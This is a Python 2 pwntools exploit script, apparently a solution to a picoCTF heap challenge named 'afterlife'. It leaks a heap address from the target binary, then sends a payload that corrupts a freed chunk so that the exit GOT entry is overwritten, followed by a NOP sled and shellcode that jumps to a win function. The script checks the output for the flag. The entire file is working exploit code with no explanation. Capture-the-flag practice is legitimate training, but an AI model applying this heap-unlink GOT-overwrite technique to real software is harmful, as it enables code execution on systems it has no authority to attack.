from pwn import *
import sys
import string

DEBUG = True

context.binary='/problems/afterlife_1_1a985526d55f084c5fbe4688631e7d51/vuln'
context.terminal=['tmux', 'splitw', '-v']
def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process(argv=['/problems/afterlife_1_1a985526d55f084c5fbe4688631e7d51/vuln', 'AAAAAAAAAAAAAAAAAAABBB'], stdin=stdin, stdout=stdout)


exit_got = p32(0x0804d02c - 12) #sets this as if exit got was the next addr in a freeblock
def test(guess):
    start()
    sh.recvuntil('decimal...\n')
    first_addr_str = sh.recvline()
    first_addr = int(first_addr_str)
    print first_addr
    print sh.sendlineafter('useful...', exit_got+p32(first_addr+8)+asm('nop; '*200+'mov eax, 0x41414141; push 0x08048966; ret'))
    output = sh.recvall()
    print output
    if 'pico' in output:
        print output
        return True
    else:
        return False

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
